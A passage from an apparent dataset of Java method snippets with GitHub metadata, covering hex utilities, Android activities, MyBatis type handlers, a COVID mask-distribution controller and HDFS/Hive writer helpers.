"https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/utils/HexUtil.java", "stars": "2", "class": {"name": "HexUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "formatHexString", "params": ["byte"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String formatHexString(byte[] data) {        return formatHexString(data, false);    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/utils/HexUtil.java", "stars": "2", "class": {"name": "HexUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "formatHexString", "params": ["byte", "boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String formatHexString(byte[] data, boolean addSpace) {        if (data == null || data.length < 1)            return null;        StringBuilder sb = new StringBuilder();        for (int i = 0; i < data.length; i++) {            String hex = Integer.toHexString(data[i] & 0xFF);            if (hex.length() == 1) {                hex = '0' + hex;            }            sb.append(hex);            if (addSpace)                sb.append(\" \");        }        return sb.toString().trim();    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/utils/HexUtil.java", "stars": "2", "class": {"name": "HexUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "decodeHex", "params": ["char"], "throws": null, "modifiers": ["public", "static"], "return_type": "byte", "snippet": "    public static byte[] decodeHex(char[] data) {        int len = data.length;        if ((len & 0x01) != 0) {            throw new RuntimeException(\"Odd number of characters.\");        }        byte[] out = new byte[len >> 1];        // two characters form the hex value.        for (int i = 0, j = 0; j < len; i++) {            int f = toDigit(data[j], j) << 4;            j++;            f = f | toDigit(data[j], j);            j++;            out[i] = (byte) (f & 0xFF);        }        return out;    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/utils/HexUtil.java", "stars": "2", "class": {"name": "HexUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toDigit", "params": ["char", "int"], "throws": null, "modifiers": ["static", "protected"], "return_type": "int", "snippet": "    protected static int toDigit(char ch, int index) {        int digit = Character.digit(ch, 16);        if (digit == -1) {            throw new RuntimeException(\"Illegal hexadecimal character \" + ch                    + \" at index \" + index);        }        return digit;    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/utils/HexUtil.java", "stars": "2", "class": {"name": "HexUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "hexStringToBytes", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "byte", "snippet": "    public static byte[] hexStringToBytes(String hexString) {        if (hexString == null || hexString.equals(\"\")) {            return null;        }        hexString = hexString.trim();        hexString = hexString.toUpperCase();        int length = hexString.length() / 2;        char[] hexChars = hexString.toCharArray();        byte[] d = new byte[length];        for (int i = 0; i < length; i++) {            int pos = i * 2;            d[i] = (byte) (charToByte(hexChars[pos]) << 4 | charToByte(hexChars[pos + 1]));        }        return d;    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/utils/HexUtil.java", "stars": "2", "class": {"name": "HexUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "charToByte", "params": ["char"], "throws": null, "modifiers": ["public", "static"], "return_type": "byte", "snippet": "    public static byte charToByte(char c) {        return (byte) \"0123456789ABCDEF\".indexOf(c);    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/utils/HexUtil.java", "stars": "2", "class": {"name": "HexUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "extractData", "params": ["byte", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String extractData(byte[] data, int position) {        return HexUtil.formatHexString(new byte[]{data[position]});    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/utils/HexUtil.java", "stars": "2", "class": {"name": "HexUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onClick", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onClick (android.view.View p0)\t{\t\tn_onClick (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/StepperRendererManager_StepperListener.java", "stars": "2", "class": {"name": "StepperRendererManager_StepperListener", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "n_onClick", "params": ["android"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onClick (android.view.View p0);\tprivate java.util.ArrayList refList;\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/StepperRendererManager_StepperListener.java", "stars": "2", "class": {"name": "StepperRendererManager_StepperListener", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/StepperRendererManager_StepperListener.java", "stars": "2", "class": {"name": "StepperRendererManager_StepperListener", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/StepperRendererManager_StepperListener.java", "stars": "2", "class": {"name": "StepperRendererManager_StepperListener", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "setNonNullParameter", "params": ["PreparedStatement", "int", "OffsetDateTime", "JdbcType"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void setNonNullParameter(PreparedStatement ps, int i, OffsetDateTime parameter, JdbcType jdbcType)          throws SQLException {    ps.setObject(i, parameter);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/OffsetDateTimeTypeHandler.java", "stars": "15", "class": {"name": "OffsetDateTimeTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "getNullableResult", "params": ["ResultSet", "String"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "OffsetDateTime", "snippet": "  public OffsetDateTime getNullableResult(ResultSet rs, String columnName) throws SQLException {    return rs.getObject(columnName, OffsetDateTime.class);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/OffsetDateTimeTypeHandler.java", "stars": "15", "class": {"name": "OffsetDateTimeTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "getNullableResult", "params": ["ResultSet", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "OffsetDateTime", "snippet": "  public OffsetDateTime getNullableResult(ResultSet rs, int columnIndex) throws SQLException {    return rs.getObject(columnIndex, OffsetDateTime.class);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/OffsetDateTimeTypeHandler.java", "stars": "15", "class": {"name": "OffsetDateTimeTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "getNullableResult", "params": ["CallableStatement", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "OffsetDateTime", "snippet": "  public OffsetDateTime getNullableResult(CallableStatement cs, int columnIndex) throws SQLException {    return cs.getObject(columnIndex, OffsetDateTime.class);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/OffsetDateTimeTypeHandler.java", "stars": "15", "class": {"name": "OffsetDateTimeTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "recupererInfosDemandeur", "params": ["IdentiteDemandeurUI", "String", "String", "Model"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String recupererInfosDemandeur(@ModelAttribute IdentiteDemandeurUI identiteDemandeur,                                          @CookieValue(value = NOM_COOKIE_CODE_POSTAL_REMETTANT, defaultValue = \"\") String codePostal,                                          @CookieValue(value = NOM_COOKIE_TYPE_REMETTANT, defaultValue = \"\") String typeRemettant,                                          Model model) {        if (StringUtils.isBlank(codePostal) || StringUtils.isBlank(typeRemettant)) {            return \"redirect:/\";        } else if (!hashIdentiteEstValide(identiteDemandeur.getHashIdentite())) {            throw new InvalidParameterException(\"Hash invalide\");        }        Map<TypeMasque, Integer> nbMasquesDistribuesParType = recupererDistributionsMasques.verifier(identiteDemandeur.getHashIdentite());        model.addAttribute(                \"infosDemandeur\",                infosDemandeurUIMapper.toInfosDemandeurUI(nbMasquesDistribuesParType, identiteDemandeur)        );        return \"distribution-masques\";    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/main/java/fr/gouv/interieur/dmgp/remettant/application/ui/RecuperationInfosDemandeurController.java", "stars": "5", "class": {"name": "RecuperationInfosDemandeurController", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "hashIdentiteEstValide", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean hashIdentiteEstValide(String hashIdentite) {        boolean estDeLaBonneLongueur = hashIdentite.length() == 88;        boolean estBienEnBase64 = isBase64(hashIdentite);        return estDeLaBonneLongueur && estBienEnBase64;    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/main/java/fr/gouv/interieur/dmgp/remettant/application/ui/RecuperationInfosDemandeurController.java", "stars": "5", "class": {"name": "RecuperationInfosDemandeurController", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {        // \u8bbe\u7f6e\u4e00\u4e2aexit transition        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {            getWindow().requestFeature(Window.FEATURE_CONTENT_TRANSITIONS);            getWindow().setEnterTransition(new Explode());            getWindow().setExitTransition(new Explode());        }        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_fragment);        newFragment = new VideoFragment();        FragmentTransaction transaction = getSupportFragmentManager().beginTransaction();        transaction.replace(R.id.frameLayout, newFragment);        transaction.addToBackStack(null);        transaction.commit();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/FragmentVideoActivity.java", "stars": "2", "class": {"name": "FragmentVideoActivity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onBackPressed", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBackPressed() {        if (newFragment.onBackPressed()) {            return;        }        finish();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/FragmentVideoActivity.java", "stars": "2", "class": {"name": "FragmentVideoActivity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        System.out.println(\"\u5236\u4f5c\u540e\u7aef\u8bfe\u7a0b\");        AbstractCourse javaCourse = new JavaCourse();        javaCourse.makeCourse();        System.out.println(\"-----------------\");        System.out.println(\"\u5236\u4f5c\u524d\u7aef\u8bfe\u7a0b\");        AbstractCourse frontEndCourse = new FrontEndCourse(true);        frontEndCourse.makeCourse();    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/templatemethod/CourseTest.java", "stars": "2", "class": {"name": "CourseTest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "createCar", "params": ["Class"], "throws": null, "modifiers": ["public", "static"], "return_type": "Car", "snippet": "    public static Car createCar(Class c){        Car car = null;        try {            car = (Car) Class.forName(c.getName()).newInstance();        } catch (InstantiationException e) {            e.printStackTrace();        } catch (IllegalAccessException e) {            e.printStackTrace();        } catch (ClassNotFoundException e) {            e.printStackTrace();        }        return car;    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/simplefactory/CarFactory.java", "stars": "2", "class": {"name": "CarFactory", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setup", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setup() {        testBook = new BookEntry(DEFAULT_TITLE, DEFAULT_AUTHORS, DEFAULT_RATING, DEFAULT_ISBN, DEFAULT_PAGES);    }", "url": "https://raw.githubusercontent.com/LJacksonPan/Y1-OOP-CW3/master/tests/BookEntryTest.java", "stars": "6", "class": {"name": "BookEntryTest", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getValue() {        return this.value;    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/core/src/main/java/com/nitro/core/communication/codec/Short.java", "stars": "2", "class": {"name": "Short", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(@Nullable Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_welcome_screen);        SharedPreferences mSettings = PreferenceManager.getDefaultSharedPreferences(this);        String lang = mSettings.getString(\"lang\", \"en\");        Utility.setLocale(lang,getBaseContext(),this);        CallService callService = new CallService(this,this, Constant.SERVICE_NO_LOADING);        callService.execute(\"dayone/country/indonesia\", Constant.METHOD_GET);    }", "url": "https://raw.githubusercontent.com/fadhilahramadhan/Android_Covid19Stats/master/app/src/main/java/fadhilah/ramadhan/covid19stats/Activity/WelcomeScreenActivity.java", "stars": "2", "class": {"name": "WelcomeScreenActivity", "extends": "AppCompatActivity", "implements": ["AsyncTaskCompleteListener"], "modifiers": ["public"]}}, {"method_name": "onTaskComplete", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onTaskComplete(Object[] params) {        String result = (String) params[0];        if(Utility.cekValidResult(result, this)){            GlobalVar.getInstance().setDataStatsCountry(Utility.buildDataStats(result));            Intent intent = new Intent(this, MainActivity.class);            startActivity(intent);            finish();        }    }", "url": "https://raw.githubusercontent.com/fadhilahramadhan/Android_Covid19Stats/master/app/src/main/java/fadhilah/ramadhan/covid19stats/Activity/WelcomeScreenActivity.java", "stars": "2", "class": {"name": "WelcomeScreenActivity", "extends": "AppCompatActivity", "implements": ["AsyncTaskCompleteListener"], "modifiers": ["public"]}}, {"method_name": "getUgi", "params": [], "throws": null, "modifiers": [], "return_type": "UserGroupInformation", "snippet": "    UserGroupInformation getUgi(){        return ugi;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getFileSystem", "params": ["String", "Configuration"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void getFileSystem(String defaultFS, Configuration taskConfig) {        hadoopConf = new org.apache.hadoop.conf.Configuration();        this.writerConfig = taskConfig;        Configuration hadoopSiteParams = taskConfig.getConfiguration(Key.HADOOP_CONFIG);        JSONObject hadoopSiteParamsAsJsonObject = JSON.parseObject(taskConfig.getString(Key.HADOOP_CONFIG));        if (null != hadoopSiteParams) {            Set<String> paramKeys = hadoopSiteParams.getKeys();            for (String each : paramKeys) {                hadoopConf.set(each, hadoopSiteParamsAsJsonObject.getString(each));            }        }        hadoopConf.set(HDFS_DEFAULT_FS_KEY, defaultFS);        //disable automatic close        hadoopConf.setBoolean(FS_AUTOMATIC_CLOSE_KEY, false);        //if use kerberos authentication        this.haveKerberos = taskConfig.getBool(Key.HAVE_KERBEROS, false);        HdfsUserGroupInfoLock.lock();        try {            if (haveKerberos) {                this.kerberosKeytabFilePath = taskConfig.getString(Key.KERBEROS_KEYTAB_FILE_PATH);                this.kerberosPrincipal = taskConfig.getString(Key.KERBEROS_PRINCIPAL);                hadoopConf.set(HADOOP_SECURITY_AUTHENTICATION_KEY, \"kerberos\");                //disable the cache                this.hadoopConf.setBoolean(                        String.format(FS_DISABLE_CACHE, URI.create(this.hadoopConf.get(FS_DEFAULT_NAME_KEY, \"\")).getScheme()), true);                hadoopConf.setBoolean(FALLBACK_TO_SIMPLE_AUTH_KEY, true);                ugi = getUgiByKerberos(this.hadoopConf, this.kerberosPrincipal, this.kerberosKeytabFilePath);            } else {                ugi = getUgiInAuth(taskConfig);            }            try {                fileSystem = ugi.doAs((PrivilegedExceptionAction<FileSystem>) () -> {                    conf = new JobConf(hadoopConf);                    FileSystem fs;                    try {                        fs = FileSystem.get(conf);                        fs.exists(new Path(\"/\"));                    } catch (IOException e) {                        String message = String.format(\"\u83b7\u53d6FileSystem\u65f6\u53d1\u751f\u7f51\u7edcIO\u5f02\u5e38,\u8bf7\u68c0\u67e5\u60a8\u7684\u7f51\u7edc\u662f\u5426\u6b63\u5e38!HDFS\u5730\u5740\uff1a[%s]\",                                \"message:defaultFS =\" + defaultFS);                        LOG.error(message);                        throw DataXException.asDataXException(HdfsWriterErrorCode.CONNECT_HDFS_IO_ERROR, e);                    } catch (Exception e) {                        String message = String.format(\"\u83b7\u53d6FileSystem\u5931\u8d25,\u8bf7\u68c0\u67e5HDFS\u5730\u5740\u662f\u5426\u6b63\u786e: [%s]\",                                \"message:defaultFS =\" + defaultFS);                        LOG.error(message);                        throw DataXException.asDataXException(HdfsWriterErrorCode.CONNECT_HDFS_IO_ERROR, e);                    }                    return fs;                });            } catch (Exception e) {                throw DataXException.asDataXException(HdfsWriterErrorCode.CONNECT_HDFS_IO_ERROR, e);            }        }finally{            HdfsUserGroupInfoLock.unlock();        }        if (null == fileSystem || null == conf) {            String message = String.format(\"\u83b7\u53d6FileSystem\u5931\u8d25,\u8bf7\u68c0\u67e5HDFS\u5730\u5740\u662f\u5426\u6b63\u786e: [%s]\",                    \"message:defaultFS =\" + defaultFS);            LOG.error(message);            throw DataXException.asDataXException(HdfsWriterErrorCode.CONNECT_HDFS_IO_ERROR, message);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "updateHiveMetaData", "params": ["String", "String", "String", "MetaSchema"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void updateHiveMetaData(String database, String table, String hiveMetaStoreUris,MetaSchema metaSchema){        Hive hive = null;        try {            try {                hive = getHiveConnByUris(hiveMetaStoreUris);                IMetaStoreClient metaStoreClient = hive.getMSC();                Table tableInfo = metaStoreClient.getTable(database, table);                StorageDescriptor storageDescriptor = tableInfo.getSd();                List<MetaSchema.FieldSchema> fieldSchemas = metaSchema.getFieldSchemas();                List<FieldSchema> cols = new ArrayList<>();                fieldSchemas.forEach(fieldSchema -> cols.add(new FieldSchema(fieldSchema.getName(), fieldSchema.getType(),                        fieldSchema.getComment())));                storageDescriptor.setCols(cols);                SerDeInfo serDeInfo = metaSchema.getSchemaInfo(Key.HIVE_META_SERDE_INFO, SerDeInfo.class);                if (null != serDeInfo) {                    storageDescriptor.setSerdeInfo(serDeInfo);                }                Integer numBuckets = metaSchema.getSchemaInfo(Key.HIVE_META_NUM_BUCKETS, Integer.class);                if (null != numBuckets) {                    storageDescriptor.setNumBuckets(numBuckets);                }                List<String> bucketCols = metaSchema.getSchemaInfoList(Key.HIVE_META_BUCKET_COLS, String.class);                if (null != bucketCols) {                    storageDescriptor.setBucketCols(bucketCols);                }                List<Order> sortCols = metaSchema.getSchemaInfoList(Key.HIVE_META_SORT_COLS, Order.class);                if (null != sortCols) {                    storageDescriptor.setSortCols(sortCols);                }                String inputFormat = metaSchema.getSchemaInfo(Key.HIVE_META_INPUT_FORMAT, String.class);                if (null != inputFormat) {                    storageDescriptor.setInputFormat(inputFormat);                }                String outputFormat = metaSchema.getSchemaInfo(Key.HIVE_META_OUTPUT_FORMAT, String.class);                if (null != outputFormat) {                    storageDescriptor.setOutputFormat(outputFormat);                }                Map<String, String> parameters = metaSchema.getSchemaInfoMap(Key.HIVE_META_PARAMETERS, String.class, String.class);                if (null != parameters && !parameters.isEmpty()) {                    storageDescriptor.setParameters(parameters);                }                Boolean compressed = metaSchema.getSchemaInfo(Key.HIVE_META_COMPRESSED, Boolean.class);                if (null != compressed) {                    storageDescriptor.setCompressed(compressed);                }                //alter_table finally                metaStoreClient.alter_table(database, table, tableInfo, true);            } finally {                if (null != hive) {                    hive.getMSC().close();                }            }        }catch(Exception e){            LOG.error(\"Update hive metadata error table:[{}], database:[{}]\", table, database, e);            throw DataXException.asDataXException(HdfsWriterErrorCode.UPDATE_HIVE_META, e.getMessage());        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "updateConfigByHiveMeta", "params": ["String", "String", "String", "Configuration"], "throws": null, "modifiers": [], "return_type": "boolean", "snippet": "    boolean updateConfigByHiveMeta(String database, String table,                                   String hiveMetaStoreUris, Configuration originConfig){        try{            IMetaStoreClient client = null;            boolean affect = false;            try{                Hive hive = getHiveConnByUris(hiveMetaStoreUris);                client = hive.getMSC();                Table tableInfo = client.getTable(database, table);                StorageDescriptor descriptor = tableInfo.getSd();                String partitionValues = originConfig.getString(Key.PARTITIONS_VALUES);                if(StringUtils.isNotBlank(partitionValues)){                    String[] partitions = partitionValues.split(\",\");                    Partition partition= null;                    try{                        partition = client.getPartition(database, table, Arrays.asList(partitions));                    }catch(Exception e){                        LOG.error(e.getMessage());                        //ignore                    }                    if(null != partition){                        //if the partition exists, use its storage descriptor                        descriptor = partition.getSd();                    }                }                String fileType = detectFileType(descriptor);                if(StringUtils.isNotBlank(fileType) && !fileType                        .equalsIgnoreCase(originConfig.getString(Key.FILE_TYPE, \"\"))){                    affect = true;                    originConfig.set(Key.FILE_TYPE, fileType);                    if(fileType.equalsIgnoreCase(HiveFileType.TEXT.toString())){                        originConfig.set(Key.COMPRESS, \"GZIP\");                    }else if(fileType.equalsIgnoreCase(HiveFileType.ORC.toString())){                        originConfig.set(Key.COMPRESS, \"SNAPPY\");                    }else{                        originConfig.set(Key.COMPRESS, null);                    }                }                String fieldDelimiter = descriptor.getSerdeInfo().getParameters().getOrDefault(Constant.META_FIELD_DELIMITER, \"\");                if(StringUtils.isNotEmpty(fieldDelimiter)                        && !fieldDelimiter.equalsIgnoreCase(originConfig                        .getString(com.alibaba.datax.plugin.unstructuredstorage.writer.Key.FIELD_DELIMITER, \"\"))){                    affect = true;                    originConfig.set(com.alibaba.datax.plugin.unstructuredstorage.writer.Key.FIELD_DELIMITER, fieldDelimiter);                }                if(null == originConfig.getListConfiguration(Key.COLUMN)){                    affect = true;                    List<MetaSchema.FieldSchema> fieldSchemas = new ArrayList<>();                    descriptor.getCols().forEach(col -> fieldSchemas.add(new MetaSchema.FieldSchema(col.getName(), col.getType(), null)));                    originConfig.set(Key.COLUMN, fieldSchemas);                }                //to add partition                if(StringUtils.isNotBlank(originConfig.getString(Key.PARTITIONS_VALUES, \"\"))){                    addHiveTablePartitions(hive, database, table, originConfig.getString(Key.PARTITIONS_VALUES, \"\"));                }                return affect;            }finally{                if(null != client){                    client.close();                }            }        }catch(Exception e){            if(e instanceof DataXException){                throw (DataXException)e;            }            LOG.error(\"Fail to update configuration\", e);            throw DataXException.asDataXException(HdfsWriterErrorCode.UPDATE_CONFIG_ERROR, e.getMessage());        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "hdfsDirList", "params": ["String"], "throws": null, "modifiers": [], "return_type": "String", "snippet": "    String[] hdfsDirList(String dir) {        Path path = new Path(dir);        String[] files = null;        try {            FileStatus[] status = fileSystem.listStatus(path);            files = new String[status.length];            for (int i = 0; i < status.length; i++) {                files[i] = status[i].getPath().toString();            }        } catch (IOException e) {            String message = String.format(\"\u83b7\u53d6\u76ee\u5f55[%s]\u6587\u4ef6\u5217\u8868\u65f6\u53d1\u751f\u7f51\u7edcIO\u5f02\u5e38,\u8bf7\u68c0\u67e5\u60a8\u7684\u7f51\u7edc\u662f\u5426\u6b63\u5e38\uff01\", dir);            LOG.error(message);            throw DataXException.asDataXException(HdfsWriterErrorCode.CONNECT_HDFS_IO_ERROR, e);        }        return files;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "hdfsDirList", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "Path", "snippet": "    public Path[] hdfsDirList(String dir, String fileName) {        Path path = new Path(dir);        Path[] files = null;        String filterFileName = fileName + \"__*\";        try {            PathFilter pathFilter = new GlobFilter(filterFileName);            FileStatus[] status = fileSystem.listStatus(path, pathFilter);            files = new Path[status.length];            for (int i = 0; i < status.length; i++) {                files[i] = status[i].getPath();            }        } catch (IOException e) {            String message = String.format(\"\u83b7\u53d6\u76ee\u5f55[%s]\u4e0b\u6587\u4ef6\u540d\u4ee5[%s]\u5f00\u5934\u7684\u6587\u4ef6\u5217\u8868\u65f6\u53d1\u751f\u7f51\u7edcIO\u5f02\u5e38,\u8bf7\u68c0\u67e5\u60a8\u7684\u7f51\u7edc\u662f\u5426\u6b63\u5e38\uff01\",                    dir, fileName);            LOG.error(message);            throw DataXException.asDataXException(HdfsWriterErrorCode.CONNECT_HDFS_IO_ERROR, e);        }        return files;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isPathexists", "params": ["String"], "throws": null, "modifiers": [], "return_type": "boolean", "snippet": "    boolean isPathexists(String filePath) {        Path path = new Path(filePath);        boolean exist = false;        try {            exist = fileSystem.exists(path);        } catch (IOException e) {            String message = String.format(\"\u5224\u65ad\u6587\u4ef6\u8def\u5f84[%s]\u662f\u5426\u5b58\u5728\u65f6\u53d1\u751f\u7f51\u7edcIO\u5f02\u5e38,\u8bf7\u68c0\u67e5\u60a8\u7684\u7f51\u7edc\u662f\u5426\u6b63\u5e38\uff01\",                    \"message:filePath =\" + filePath);            LOG.error(message);            throw DataXException.asDataXException(HdfsWriterErrorCode.CONNECT_HDFS_IO_ERROR, e);        }        return exist;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isPathDir", "params": ["String"], "throws": null, "modifiers": [], "return_type": "boolean", "snippet": "    boolean isPathDir(String filePath) {        Path path = new Path(filePath);        boolean isDir = false;        try {            isDir = fileSystem.isDirectory(path);        } catch (IOException e) {            String message = String.format(\"\u5224\u65ad\u8def\u5f84[%s]\u662f\u5426\u662f\u76ee\u5f55\u65f6\u53d1\u751f\u7f51\u7edcIO\u5f02\u5e38,\u8bf7\u68c0\u67e5\u60a8\u7684\u7f51\u7edc\u662f\u5426\u6b63\u5e38\uff01\", filePath);            LOG.error(message);            throw DataXException.asDataXException(HdfsWriterErrorCode.CONNECT_HDFS_IO_ERROR, e);        }        return isDir;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "mkdirs", "params": ["Path"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void mkdirs(Path path){        try {            